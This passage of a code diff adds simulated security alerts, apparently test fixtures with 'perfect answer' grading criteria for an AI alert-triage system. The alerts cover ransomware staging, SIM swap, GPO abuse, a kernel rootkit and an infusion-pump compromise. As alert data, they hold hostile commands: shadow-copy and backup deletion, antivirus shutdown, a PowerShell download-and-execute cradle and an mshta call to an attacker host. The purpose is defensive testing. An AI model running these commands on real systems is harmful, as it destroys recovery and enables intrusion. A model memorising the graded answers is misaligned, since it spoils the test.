@@ -3168,6 +3168,812 @@ _RECENT_AKIRA = _j(r"""
 
 
 
+# ── v11 SIM payloads (2026-07-26) — capability-ceiling probes.
+# Five hand-authored alerts, each targeting a different ceiling:
+#   SIM-001 decision-making under pressure (binary isolate call + business trade-off)
+#   SIM-002 root-cause tracing with NO network IOCs (telecom-layer attack)
+#   SIM-003 source-host mismatch + multi-payload decomposition + time criticality
+#   SIM-004 kernel-level technical explanation + correct remediation depth
+#   SIM-005 human-life prioritisation over forensics (patient-connected device)
+# Full "what perfect looks like" grading criteria live in each test_notes.
+# Offence IDs 90132-90136.
+
+_SIM_001 = _j(r"""
+{
+  "_test_meta": {
+    "test_payload_id": "S1_ransomware_pre_encryption_isolation_decision",
+    "expected_verdict": "MALICIOUS_CONFIRMED",
+    "expected_category_id": 103,
+    "expected_guardrails_that_should_fire": [
+      "propose_destructive_actions_on_confirmed_ransomware",
+      "require_analyst_approval_for_destructive"
+    ],
+    "expected_vendor_semantics": [
+      "decision.binary_isolate_recommendation_required",
+      "decision.business_tradeoff_analysis_required",
+      "correlation.prior_cobalt_strike_incident_281944",
+      "credential.plaintext_password_in_command_line",
+      "ransomware.backup_destruction_chain"
+    ]
+  },
+  "title": "Ransomware Pre-Encryption Staging on Finance Server",
+  "source": "CrowdStrike Falcon",
+  "event_type": "DetectionSummaryEvent",
+  "timestamp": "2026-06-15T15:22:11Z",
+  "severity": "Critical",
+  "confidence": 92,
+  "detection": {
+    "name": "Pre-Ransomware Activity Detected",
+    "description": "Systematic defense evasion and backup destruction sequence on critical finance server",
+    "technique": "T1490"
+  },
+  "host": {
+    "hostname": "FIN-SRV-04",
+    "ip": "10.10.8.4",
+    "os": "Windows Server 2022",
+    "domain": "ACMECORP",
+    "role": "Accounts Payable Processing Server",
+    "s3_score": 92,
+    "asset_criticality": "CRITICAL",
+    "uptime_days": 847,
+    "last_patched": "2025-11-20"
+  },
+  "user": {
+    "username": "ACMECORP\\j.martinez",
+    "department": "IT Operations",
+    "previous_alerts": "Cobalt Strike beacon detected on j.martinez workstation 7 days ago (incident #281944)"
+  },
+  "process_tree": [
+    {
+      "name": "vssadmin.exe",
+      "pid": 6712,
+      "command_line": "vssadmin.exe delete shadows /all /quiet",
+      "timestamp": "2026-06-15T15:22:11Z",
+      "parent": "cmd.exe",
+      "grandparent": "powershell.exe",
+      "user": "ACMECORP\\j.martinez",
+      "note": "Shadow copy deletion — eliminates local recovery capability"
+    },
+    {
+      "name": "wmic.exe",
+      "pid": 6734,
+      "command_line": "wmic shadowcopy delete",
+      "timestamp": "2026-06-15T15:22:18Z",
+      "parent": "cmd.exe",
+      "note": "Redundant shadow copy deletion via WMI — ensures all shadows are removed even if vssadmin is blocked"
+    },
+    {
+      "name": "bcdedit.exe",
+      "pid": 6801,
+      "command_line": "bcdedit /set {default} recoveryenabled No",
+      "timestamp": "2026-06-15T15:22:34Z",
+      "parent": "cmd.exe",
+      "note": "Disables Windows Recovery Environment — prevents booting into recovery mode"
+    },
+    {
+      "name": "bcdedit.exe",
+      "pid": 6823,
+      "command_line": "bcdedit /set {default} bootstatuspolicy ignoreallfailures",
+      "timestamp": "2026-06-15T15:22:41Z",
+      "parent": "cmd.exe",
+      "note": "Suppresses boot failure prompts — prevents user from entering recovery"
+    },
+    {
+      "name": "wbadmin.exe",
+      "pid": 6867,
+      "command_line": "wbadmin delete catalog -quiet",
+      "timestamp": "2026-06-15T15:23:02Z",
+      "parent": "cmd.exe",
+      "note": "Deletes Windows backup catalog — destroys backup index"
+    },
+    {
+      "name": "reg.exe",
+      "pid": 6912,
+      "command_line": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f",
+      "timestamp": "2026-06-15T15:23:15Z",
+      "parent": "cmd.exe",
+      "note": "Disables Windows Defender via registry policy"
+    },
+    {
+      "name": "powershell.exe",
+      "pid": 6945,
+      "command_line": "powershell -c \"Get-Service -Name 'WinDefend' | Stop-Service -Force\"",
+      "timestamp": "2026-06-15T15:23:22Z",
+      "parent": "cmd.exe",
+      "note": "Force stops Windows Defender service"
+    },
+    {
+      "name": "net.exe",
+      "pid": 6978,
+      "command_line": "net stop \"Sophos Agent\" /y",
+      "timestamp": "2026-06-15T15:23:38Z",
+      "parent": "cmd.exe",
+      "note": "Stops Sophos endpoint protection agent"
+    },
+    {
+      "name": "net.exe",
+      "pid": 7001,
+      "command_line": "net stop \"Sophos AutoUpdate Service\" /y",
+      "timestamp": "2026-06-15T15:23:45Z",
+      "parent": "cmd.exe",
+      "note": "Stops Sophos update service — prevents re-enabling"
+    },
+    {
+      "name": "powershell.exe",
+      "pid": 7034,
+      "command_line": "powershell -c \"Get-ADComputer -Filter * | Select-Object -ExpandProperty Name\" > C:\\Windows\\Temp\\hosts.txt",
+      "timestamp": "2026-06-15T15:24:01Z",
+      "parent": "cmd.exe",
+      "note": "Enumerates ALL domain computers — preparing target list for lateral encryption"
+    },
+    {
+      "name": "powershell.exe",
+      "pid": 7056,
+      "command_line": "powershell -c \"(Get-Content C:\\Windows\\Temp\\hosts.txt).Count\"",
+      "timestamp": "2026-06-15T15:24:18Z",
+      "parent": "cmd.exe",
+      "result": "312",
+      "note": "Counts targets — attacker now knows there are 312 domain computers to encrypt"
+    },
+    {
+      "name": "ping.exe",
+      "pid": 7089,
+      "command_line": "ping -n 1 FIN-DB-01",
+      "timestamp": "2026-06-15T15:24:33Z",
+      "note": "Checking if finance database server is reachable"
+    },
+    {
+      "name": "ping.exe",
+      "pid": 7101,
+      "command_line": "ping -n 1 FIN-DB-02",
+      "timestamp": "2026-06-15T15:24:35Z",
+      "note": "Checking finance database replica"
+    },
+    {
+      "name": "ping.exe",
+      "pid": 7112,
+      "command_line": "ping -n 1 BACKUP-SRV-01",
+      "timestamp": "2026-06-15T15:24:37Z",
+      "note": "Checking if backup server is reachable — targeting backup infrastructure"
+    },
+    {
+      "name": "net.exe",
+      "pid": 7134,
+      "command_line": "net use \\\\BACKUP-SRV-01\\Backups$ /user:ACMECORP\\svc-backup Winter2025!",
+      "timestamp": "2026-06-15T15:24:55Z",
+      "result": "command completed successfully",
+      "note": "Mounted backup share using service account credentials — PLAINTEXT PASSWORD IN COMMAND LINE"
+    },
+    {
+      "name": "cmd.exe",
+      "pid": 7167,
+      "command_line": "cmd /c dir \\\\BACKUP-SRV-01\\Backups$ /s | find \"acme-ap-\"",
+      "timestamp": "2026-06-15T15:25:11Z",
+      "result": "47 backup files found, 2.3TB total",
+      "note": "Enumerating AP backup files — attacker is about to encrypt or delete 2.3TB of backups"
+    }
+  ],
+  "business_context": {
+    "server_function": "Processes all vendor payments for ACMECORP. Downtime means no accounts payable processing.",
+    "daily_transaction_volume": "$2.4M average",
+    "dependent_systems": [
+      "FIN-DB-01 (primary AP database)",
+      "FIN-DB-02 (replica)",
+      "ERP-SAP-01 (SAP integration)"
+    ],
+    "backup_status": "Last verified backup: 2026-06-14T23:00:00Z (16 hours ago)",
+    "decision_required": "ISOLATE NOW or MONITOR? Server isolation stops all vendor payments immediately."
+  },
+  "category": "103 Ransomware",
+  "expected_iti_category_id": 103,
+  "expected_iti_category_name": "Ransomware",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_pre_encryption_staging",
+  "expected_severity": "SEV1",
+  "test_notes": "CAPABILITY-CEILING test: decision-making under pressure. 16 sequential commands destroy every recovery path (vssadmin + wmic shadowcopy + bcdedit x2 + wbadmin catalog), disable both AV stacks (Defender registry + service, Sophos agent + updater), then enumerate 312 domain computers and mount the backup share with a PLAINTEXT service-account password. Actor j.martinez is linked to Cobalt Strike incident #281944 seven days ago. PERFECT ANSWER: an unambiguous YES/NO isolation call with business trade-off — 'ISOLATE NOW; AP downtime costs money, ransomware across 312 hosts costs everything' — at high confidence, citing the $2.4M/day AP impact against 312-host encryption risk. Graders should fail any hedged 'monitor and investigate' response: the backup-destruction chain is complete and encryption is imminent."
+}
+""")
+
+_SIM_002 = _j(r"""
+{
+  "_test_meta": {
+    "test_payload_id": "S2_sim_swap_okta_aws_no_network_ioc",
+    "expected_verdict": "MALICIOUS_CONFIRMED",
+    "expected_category_id": 108,
+    "expected_guardrails_that_should_fire": [
+      "never_require_network_ioc_for_identity_attack"
+    ],
+    "expected_vendor_semantics": [
+      "identity.sim_swap_root_cause",
+      "identity.imei_change_is_definitive_indicator",
+      "identity.mfa_factor_deactivation_locks_out_owner",
+      "identity.self_escalation_to_super_admin",
+      "blast_radius.okta_tenant_plus_aws_production"
+    ]
+  },
+  "title": "SIM Swap MFA Bypass — CTO Account Takeover to AWS",
+  "source": "Okta System Log + Twilio Verify + AWS CloudTrail",
+  "event_type": "IdentityCompromise",
+  "timestamp": "2026-06-15T19:33:00Z",
+  "severity": "Critical",
+  "confidence": 85,
+  "target_user": {
+    "email": "cto@acmecorp.com",
+    "display_name": "Sarah Chen",
+    "title": "Chief Technology Officer",
+    "mfa_methods": [
+      "SMS (+1-415-555-0187)",
+      "Okta Verify Push"
+    ],
+    "last_successful_login": "2026-06-15T08:22:00Z",
+    "login_location": "San Francisco, CA",
+    "privileged_roles": [
+      "Okta Read-Only Administrator",
+      "AWS AWSAdministratorAccess (via SSO)"
+    ],
+    "access_scope": "Full AWS production environment, all engineering repositories, CI/CD pipeline secrets"
+  },
+  "events": [
+    {
+      "sequence": 1,
+      "timestamp": "2026-06-15T19:33:00Z",
+      "source": "Twilio Verify",
+      "type": "SMS_DELIVERY_FAILURE",
+      "detail": "SMS OTP delivery to +1-415-555-0187 failed. Carrier response: 'number not in service'. Previous successful delivery: 2026-06-15T08:22:15Z (11 hours ago). This number has had 100% delivery success for 3 years.",
+      "indicators": {
+        "previous_delivery_success_rate": "100%",
+        "last_successful_delivery": "2026-06-15T08:22:15Z",
+        "carrier": "T-Mobile US",
+        "failure_reason": "number_not_in_service"
+      }
+    },
+    {
+      "sequence": 2,
+      "timestamp": "2026-06-15T19:33:45Z",
+      "source": "Okta System Log",
+      "type": "user.session.start",
+      "result": "MFA_CHALLENGE_ISSUED",
+      "detail": "Authentication attempt for cto@acmecorp.com. Password correct. MFA challenge issued via SMS.",
+      "source_ip": "104.28.55.101",
+      "geo": {
+        "city": "Miami",
+        "region": "FL",
+        "country": "US"
+      },
+      "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
+      "impossible_travel": {
+        "previous_location": "San Francisco, CA",
+        "previous_time": "2026-06-15T08:22:00Z",
+        "hours_between": 11.2,
+        "distance_miles": 2585,
+        "verdict": "POSSIBLE but suspicious — would require a direct flight"
+      }
+    },
+    {
+      "sequence": 3,
+      "timestamp": "2026-06-15T19:34:12Z",
+      "source": "Twilio Verify",
+      "type": "SMS_OTP_DELIVERED",
+      "detail": "OTP successfully delivered to +1-415-555-0187. IMEI of receiving device: 354847291034567. Previous IMEI for this number: 867530912345678. IMEI CHANGED.",
+      "indicators": {
+        "previous_imei": "867530912345678",
+        "current_imei": "354847291034567",
+        "imei_changed": true,
+        "note": "IMEI change confirms SIM was moved to a different physical device — definitive SIM swap indicator"
+      }
+    },
+    {
+      "sequence": 4,
+      "timestamp": "2026-06-15T19:34:33Z",
+      "source": "Okta System Log",
+      "type": "user.session.start",
+      "result": "SUCCESS",
+      "detail": "Authentication successful. MFA verified via SMS OTP. Session created.",
+      "source_ip": "104.28.55.101",
+      "session_id": "idx_a7b3c9d2e4f1",
+      "note": "Attacker authenticated using stolen password + SIM-swapped SMS OTP"
+    },
+    {
+      "sequence": 5,
+      "timestamp": "2026-06-15T19:36:00Z",
+      "source": "Okta System Log",
+      "type": "user.mfa.factor.deactivate",
+      "detail": "All existing MFA factors removed for cto@acmecorp.com: Okta Verify Push (removed), SMS +1-415-555-0187 (removed). New SMS factor enrolled: +1-786-555-0333 (Miami area code). New Okta Verify enrolled from IMEI 354847291034567.",
+      "note": "Attacker locked out the legitimate user by removing all MFA factors and enrolling their own"
+    },
+    {
+      "sequence": 6,
+      "timestamp": "2026-06-15T19:38:22Z",
+      "source": "Okta System Log",
+      "type": "user.account.privilege.grant",
+      "detail": "Role 'Super Administrator' assigned to cto@acmecorp.com. Previous role: 'Read-Only Administrator'. Granted by: cto@acmecorp.com (self-escalation).",
+      "source_ip": "104.28.55.101",
+      "note": "CTO had permission to modify Okta roles — attacker escalated to Super Admin"
+    },
+    {
+      "sequence": 7,
+      "timestamp": "2026-06-15T19:40:15Z",
+      "source": "Okta System Log",
+      "type": "policy.lifecycle.update",
+      "detail": "Global session policy modified: max_session_lifetime changed from 28800 (8 hours) to 2592000 (30 days). MFA re-prompt changed from 'ALWAYS' to 'PER_SESSION'.",
+      "note": "Weakening authentication policies for persistent access"
+    },
+    {
+      "sequence": 8,
+      "timestamp": "2026-06-15T19:42:00Z",
+      "source": "AWS CloudTrail",
+      "type": "AssumeRoleWithSAML",
+      "detail": "Federated login to AWS via Okta SAML. Assumed role: arn:aws:iam::123456789012:role/AWSAdministratorAccess. Session name: cto@acmecorp.com.",
+      "source_ip": "104.28.55.101",
+      "region": "us-east-1",
+      "aws_actions_post_login": [
+        "sts:GetCallerIdentity",
+        "iam:ListUsers (returned 89 IAM users)",
+        "secretsmanager:ListSecrets (returned 47 secrets)",
+        "s3:ListBuckets (returned 34 buckets)",
+        "ec2:DescribeInstances (returned 267 instances)"
+      ],
+      "note": "Full AWS enumeration via SSO federation — attacker now has visibility into entire cloud infrastructure"
+    }
+  ],
+  "category": "108 Account Compromise",
+  "expected_iti_category_id": 108,
+  "expected_iti_category_name": "Account Compromise",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_sim_swap_account_takeover",
+  "expected_severity": "SEV1",
+  "test_notes": "CAPABILITY-CEILING test: root-cause tracing with NO network-based IOCs. The attack runs through telecom infrastructure. The chain a perfect answer must reconstruct: SMS delivery failure on a number with 3 years of 100% success -> IMEI change (867530912345678 -> 354847291034567), which is the DEFINITIVE SIM-swap indicator -> MFA bypass -> factor deactivation locking out the real CTO -> self-escalation Read-Only to Super Administrator -> session policy weakened 8h to 30d -> AWS AssumeRoleWithSAML and full enumeration (89 IAM users, 47 secrets, 34 buckets, 267 instances). PERFECT ANSWER: names SIM swap as root cause; blast radius = Okta tenant + AWS production; response = disable account, revert policy changes, contact the carrier. Graders should fail any answer that calls this 'impossible travel' alone or waits for a malicious IP."
+}
+""")
+
+_SIM_003 = _j(r"""
+{
+  "_test_meta": {
+    "test_payload_id": "S3_gpo_weaponization_three_payloads_45min",
+    "expected_verdict": "MALICIOUS_CONFIRMED",
+    "expected_category_id": 106,
+    "expected_guardrails_that_should_fire": [
+      "time_critical_response_required"
+    ],
+    "expected_vendor_semantics": [
+      "identity.service_account_source_host_mismatch",
+      "persistence.three_mechanisms_in_one_gpo",
+      "gpo.name_mimics_legitimate_baseline",
+      "gpo.domain_root_enforced_no_wmi_filter",
+      "response.unlink_gpo_before_next_logon_cycle"
+    ]
+  },
+  "title": "GPO Weaponization — Domain-Wide Scheduled Task Deployment",
+  "source": "Microsoft Defender for Identity",
+  "event_type": "GroupPolicyAbuse",
+  "timestamp": "2026-06-15T01:15:00Z",
+  "severity": "Critical",
+  "confidence": 87,
+  "alert": {
+    "name": "Malicious Group Policy Object Created and Linked to Domain Root",
+    "description": "Unauthorized GPO deploys scheduled task, registry persistence, and firewall exception to all 312 domain-joined computers",
+    "technique": "T1484.001"
+  },
+  "actor": {
+    "username": "ACMECORP\\svc-sccm",
+    "display_name": "SCCM Service Account",
+    "account_type": "service",
+    "source_ip": "10.10.22.94",
+    "source_hostname": "DEV-WS-0194",
+    "expected_source": "SCCM-SRV-01 (10.10.3.50)",
+    "note": "Service account used from unauthorized host — DEV-WS-0194 is a developer workstation, not the SCCM server. Account was likely compromised via credentials harvested from DEV-WS-0194."
+  },
+  "gpo_details": {
+    "gpo_name": "Windows Update Configuration - Security Baseline v4.2",
+    "gpo_guid": "{6AC1786C-016F-11D2-945F-00C04FB984F9}",
+    "gpo_created": "2026-06-15T01:15:00Z",
+    "linked_to": "DC=acmecorp,DC=local",
+    "link_enforced": true,
+    "link_order": 1,
+    "wmi_filter": "none",
+    "note": "GPO name mimics legitimate Windows Update security baseline. Linked to domain root with enforcement at link order 1 — overrides all other GPOs. No WMI filter means it applies to EVERY domain-joined machine."
+  },
+  "gpo_payload": {
+    "scheduled_task": {
+      "task_name": "WindowsUpdateHealthCheck",
+      "task_trigger": "AtLogon + Daily 02:00 UTC",
+      "task_action": "powershell.exe -ep bypass -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.22.94:8080/health')\"",
+      "run_as": "NT AUTHORITY\\SYSTEM",
+      "note": "Downloads and executes attacker payload as SYSTEM on every domain computer at logon and daily at 2am"
+    },
+    "registry_run_key": {
+      "hive": "HKLM",
+      "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_name": "SecurityHealthService",
+      "value_data": "C:\\Windows\\System32\\mshta.exe http://10.10.22.94:8080/update.hta",
+      "note": "Secondary persistence via Run key using mshta.exe (LOLBin) — executes HTA payload at every user logon"
+    },
+    "firewall_exception": {
+      "rule_name": "Windows Update Service (Inbound)",
+      "direction": "Inbound",
+      "protocol": "TCP",
+      "port": 4444,
+      "action": "Allow",
+      "note": "Opens port 4444 inbound on all domain computers — standard Metasploit/reverse shell listener port"
+    }
+  },
+  "impact_assessment": {
+    "affected_computers": 312,
+    "affected_ous": "ALL (domain root link with enforcement)",
+    "execution_timeline": "Next user logon or 02:00 UTC — whichever comes first",
+    "estimated_time_to_full_deployment": "45 minutes (based on typical logon cycle)",
+    "payload_server": "10.10.22.94 (DEV-WS-0194) — attacker's staging server on the internal network",
+    "note": "Within one logon cycle, every domain computer will have: (1) a SYSTEM-level scheduled task downloading attacker payloads, (2) a user-level Run key executing HTA via mshta.exe, (3) port 4444 open for inbound reverse shell connections. This is pre-positioning for a domain-wide ransomware deployment or persistent access operation."
+  },
+  "category": "106 Lateral Movement",
+  "expected_iti_category_id": 106,
+  "expected_iti_category_name": "Lateral Movement",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_gpo_weaponization",
+  "expected_severity": "SEV1",
+  "test_notes": "CAPABILITY-CEILING test: source-host mismatch + multi-payload decomposition + time criticality. svc-sccm authenticated from DEV-WS-0194 (10.10.22.94), NOT its expected SCCM-SRV-01 (10.10.3.50) — the mismatch is the tell. The GPO name mimics a legitimate Windows Update security baseline, is linked at domain root with enforcement at link order 1 and NO WMI filter, so it hits all 312 machines. PERFECT ANSWER: flags the source-host mismatch; identifies ALL THREE payloads (SYSTEM scheduled task with a download cradle, HKLM Run key via mshta LOLBin, inbound firewall allow on 4444); and states the time-critical action — 'unlink the GPO immediately, before the next logon cycle' (~45 minutes to full deployment). Graders should fail an answer that reports only the scheduled task."
+}
+""")
+
+_SIM_004 = _j(r"""
+{
+  "_test_meta": {
+    "test_payload_id": "S4_linux_kernel_rootkit_syscall_hooking",
+    "expected_verdict": "MALICIOUS_CONFIRMED",
+    "expected_category_id": 107,
+    "expected_guardrails_that_should_fire": [
+      "response.kill_process_is_insufficient_for_kernel_rootkit"
+    ],
+    "expected_vendor_semantics": [
+      "rootkit.lkm_syscall_hooking_getdents64_read_kill",
+      "rootkit.hidden_from_userspace_tools",
+      "rootkit.timestomping_via_touch_reference",
+      "rootkit.ssh_key_persistence_independent_of_module",
+      "response.full_rebuild_from_known_good_image"
+    ]
+  },
+  "title": "Linux Kernel Rootkit with Syscall Hooking",
+  "source": "OSSEC HIDS + CrowdStrike Falcon for Linux",
+  "event_type": "RootkitDetection",
+  "timestamp": "2026-06-15T06:15:33Z",
+  "severity": "Critical",
+  "confidence": 90,
+  "host": {
+    "hostname": "web-prod-03",
+    "ip": "10.10.50.3",
+    "os": "Ubuntu 22.04.4 LTS",
+    "kernel": "5.15.0-91-generic",
+    "role": "Production Web Server — nginx reverse proxy + Node.js API backend",
+    "s3_score": 88,
+    "asset_criticality": "HIGH",
+    "internet_facing": true,
+    "uptime_days": 127,
+    "last_patched": "2026-04-10",
+    "services": [
+      "nginx 1.24.0",
+      "node 20.11.0",
+      "postgresql-client 15"
+    ],
+    "data_classification": "Processes customer PII (names, emails, payment tokens)"
+  },
+  "findings": [
+    {
+      "type": "HIDDEN_PROCESS",
+      "severity": "Critical",
+      "detail": "Process invisible to /proc filesystem but detected via /dev/kmem direct memory analysis. PID 31337 running as root.",
+      "process": {
+        "pid": 31337,
+        "name": ".sd-pam-helper",
+        "path": "/usr/lib/systemd/.sd-pam-helper",
+        "binary_exists_on_disk": true,
+        "in_package_manifest": false,
+        "binary_hash": "a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0",
+        "binary_size_kb": 284,
+        "ps_visible": false,
+        "top_visible": false,
+        "proc_visible": false,
+        "kmem_visible": true,
+        "note": "Binary name mimics legitimate systemd PAM helper. Hidden from all userspace process listing tools (ps, top, /proc). PID 31337 = 'elite' in hacker culture — deliberate or coincidental."
+      },
+      "network_connections": [
+        {
+          "remote_ip": "91.215.85.104",
+          "remote_port": 443,
+          "protocol": "TCP",
+          "state": "ESTABLISHED",
+          "bytes_sent_24h": 847291,
+          "bytes_received_24h": 12847,
+          "connection_duration_hours": 72,
+          "note": "Persistent C2 connection to Eastern European IP. 847KB exfiltrated in 24 hours. Connection has been active for 72 hours — rootkit installed approximately 3 days ago."
+        }
+      ]
+    },
+    {
+      "type": "KERNEL_MODULE_ANOMALY",
+      "severity": "Critical",
+      "detail": "Loaded kernel module not present in system package manager or /lib/modules/.",
+      "module": {
+        "name": "netfilter_helper",
+        "hash": "d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6a7b8c9",
+        "size_kb": 47,
+        "in_package_manager": false,
+        "in_lib_modules": false,
+        "loaded_at": "2026-06-12T03:22:44Z",
+        "note": "Module name 'netfilter_helper' mimics legitimate Linux netfilter framework. Loaded 3 days ago — matches the rootkit installation timeline."
+      },
+      "hooked_syscalls": [
+        {
+          "syscall": "sys_getdents64",
+          "purpose": "Hides files and directories from ls, find, and any tool that reads directory entries",
+          "affected_tools": [
+            "ls",
+            "find",
+            "tree",
+            "du"
+          ]
+        },
+        {
+          "syscall": "sys_kill",
+          "purpose": "Intercepts kill signals — prevents administrators from terminating the rootkit process",
+          "affected_tools": [
+            "kill",
+            "killall",
+            "pkill",
+            "systemctl stop"
+          ]
+        },
+        {
+          "syscall": "sys_read",
+          "purpose": "Filters /proc entries — removes rootkit process from ps, top, htop output",
+          "affected_tools": [
+            "ps",
+            "top",
+            "htop",
+            "cat /proc/*/status"
+          ]
+        }
+      ]
+    },
+    {
+      "type": "HIDDEN_FILES",
+      "severity": "High",
+      "detail": "Files invisible to userspace tools but found via direct ext4 inode analysis.",
+      "files": [
+        {
+          "path": "/usr/lib/systemd/.sd-pam-helper",
+          "size_kb": 284,
+          "type": "ELF x86_64 executable",
+          "visible_to_ls": false,
+          "visible_to_find": false,
+          "visible_via_inode": true,
+          "description": "Rootkit backdoor binary"
+        },
+        {
+          "path": "/usr/lib/systemd/.sd-pam-helper.conf",
+          "size_kb": 2,
+          "type": "text/plain",
+          "visible_to_ls": false,
+          "content_preview": "server=91.215.85.104:443\ninterval=30\nencrypt=aes256\nexfil_path=/var/log/.journal-audit\nid=acme-web03",
+          "description": "C2 configuration file with server address, beacon interval, and encryption method"
+        },
+        {
+          "path": "/var/log/.journal-audit",
+          "size_kb": 48128,
+          "type": "data (AES-256 encrypted)",
+          "visible_to_ls": false,
+          "description": "Staged exfiltration data — 47MB of encrypted content awaiting C2 upload"
+        }
+      ]
+    },
+    {
+      "type": "TIMESTAMP_MANIPULATION",
+      "severity": "Medium",
+      "detail": "All hidden files display timestamps matching legitimate systemd files from January 2024. Actual creation time recovered from ext4 crtime (creation time) metadata.",
+      "timestomping": {
+        "displayed_mtime": "2024-01-15T00:00:00Z",
+        "actual_crtime": "2026-06-12T03:22:44Z",
+        "technique": "touch -r /usr/lib/systemd/systemd-logind .sd-pam-helper",
+        "note": "Attacker copied timestamps from legitimate systemd-logind binary to hide the rootkit's actual installation date. Standard timestomping technique."
+      }
+    },
+    {
+      "type": "SSH_PERSISTENCE",
+      "severity": "High",
+      "detail": "Unauthorized SSH public key added to root account.",
+      "ssh_key": {
+        "location": "/root/.ssh/authorized_keys",
+        "key_type": "ssh-ed25519",
+        "key_fingerprint": "SHA256:nThBg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8",
+        "key_comment": "maintenance@internal",
+        "authorized_keys_entries": 3,
+        "legitimate_keys": 2,
+        "unauthorized_keys": 1,
+        "note": "Key comment 'maintenance@internal' designed to look like a legitimate internal maintenance key. Provides persistent root SSH access independent of the rootkit."
+      }
+    }
+  ],
+  "category": "107 Malware",
+  "expected_iti_category_id": 107,
+  "expected_iti_category_name": "Malware",
+  "expected_iti_attack_severity": "SEV1",
+  "expected_verdict": "MALICIOUS_CONFIRMED",
+  "expected_disposition": "true_positive_kernel_rootkit_rebuild_required",
+  "expected_severity": "SEV1",
+  "test_notes": "CAPABILITY-CEILING test: kernel-level technical explanation + correct remediation depth. The rootkit hides via an unpackaged LKM ('netfilter_helper') hooking three syscalls: getdents64 (hides files from ls/find), sys_read (filters /proc so ps/top can't see PID 31337), and sys_kill (intercepts termination signals). Timestomped to Jan-2024 via touch -r against systemd-logind; real crtime 2026-06-12. 72-hour C2 to 91.215.85.104:443 with 847KB exfiltrated and 47MB staged encrypted at /var/log/.journal-audit. Independent root SSH key persistence. PERFECT ANSWER: explains the syscall hooking by name and effect; and gets remediation depth right — 'do not just kill the process; sys_kill is hooked so the signal is intercepted. The kernel module must be unloaded, and because kernel integrity is lost, a full rebuild from a known-good image is required.' Graders should fail 'kill the process and remove the file'."
+}
+""")
+
+_SIM_005 = _j(r"""
+{
+  "_test_meta": {
+    "test_payload_id": "S5_medical_infusion_pump_patient_safety",
+    "expected_verdict": "MALICIOUS_CONFIRMED",
+    "expected_category_id": 115,
+    "expected_guardrails_that_should_fire": [
+      "patient_safety_over_forensics",
+      "never_delay_containment_for_evidence_preservation"
+    ],
+    "expected_vendor_semantics": [
+      "safety.human_life_at_risk_primary",
+      "safety.disconnect_from_network_not_from_patient",
+      "medical.drug_limit_modification_10x_lethal",
+      "medical.fda_reportable_class_ii_device",
+      "attack.typosquat_domain_plus_cert_mismatch",
+      "attack.cve_2022_26390_unsigned_firmware"
+    ]
+  },
+  "title": "Medical IoT — Infusion Pump Firmware Compromise with Drug Limit Modification",
+  "source": "Claroty xDome + Medigate",
+  "event_type": "MedicalDeviceAnomaly",
+  "timestamp": "2026-06-15T03:45:22Z",
+  "severity": "Critical",
+  "confidence": 92,
+  "device": {
+    "name": "INF-PUMP-ICU-07",
+    "type": "Baxter Sigma Spectrum Infusion Pump",
+    "model": "35700BAX2",
+    "serial_number": "SN-2847291",
+    "firmware_version": "8.0.0",
+    "ip": "172.16.200.107",
+    "mac": "00:1A:2B:3C:4D:07",
+    "network_zone": "Medical-ICU-VLAN",
+    "fda_regulated": true,
+    "fda_class": "Class II",
+    "patient_connected": true,
+    "location": "ICU Bay 7, 3rd Floor, Main Hospital",
+    "last_maintenance": "2026-05-01",
+    "biomedical_contact": "biomed@acmehospital.com",
+    "known_vulnerabilities": [
+      {
+        "cve": "CVE-2022-26390",
+        "cvss": 5.5,
+        "description": "Baxter Spectrum WBM does not validate firmware update signatures — allows unsigned firmware to be loaded",
+        "exploited_in_this_incident": true
+      },
+      {
+        "cve": "CVE-2022-26392",
+        "cvss": 5.0,
+        "description": "Cleartext transmission of sensitive data between pump and gateway",
+        "exploited_in_this_incident": false
+      }
+    ]
+  },
+  "attack_timeline": [
+    {
+      "sequence": 1,
+      "timestamp": "2026-06-15T03:45:22Z",
+      "type": "DNS_QUERY",
+      "detail": "INF-PUMP-ICU-07 queried DNS for 'update.baxter-medical.net'. This domain is NOT part of Baxter's official infrastructure. Baxter's legitimate firmware update domain is 'updates.baxter.com'.",
+      "resolved_ip": "185.234.72.99",
+      "dns_server_queried": "172.16.0.1 (hospital DNS)",
+      "note": "Typosquat domain: baxter-medical.net vs legitimate baxter.com. Domain registered 6 days ago via Namecheap with WHOIS privacy."
+    },
+    {
+      "sequence": 2,
+      "timestamp": "2026-06-15T03:45:30Z",
+      "type": "HTTPS_CONNECTION",
+      "detail": "Infusion pump established TLS connection to 185.234.72.99:443.",
+      "certificate": {
+        "subject_cn": "update.baxter-medical.net",
+        "issuer": "Let's Encrypt Authority X3",
+        "valid_from": "2026-06-09",
+        "valid_to": "2026-09-07",
+        "note": "Baxter's legitimate certificates are issued by DigiCert. Let's Encrypt certificate on a 6-day-old domain is highly suspicious."
+      },
+      "bytes_sent": 4891,
+      "bytes_received": 287344,
+      "note": "Pump sent 4.8KB (likely device identification/status) and received 287KB (firmware payload)"
+    },
+    {
+      "sequence": 3,
+      "timestamp": "2026-06-15T03:46:15Z",
+      "type": "FIRMWARE_MODIFICATION",
+      "detail": "Write operation detected on firmware flash partition of INF-PUMP-ICU-07. 287KB written from data received from 185.234.72.99.",
+      "firmware_validation": {
+        "signature_check": "NOT PERFORMED — CVE-2022-26390",
+        "hash_before": "e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6",
+        "hash_after": "f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7",
+        "integrity_status": "COMPROMISED"
+      },
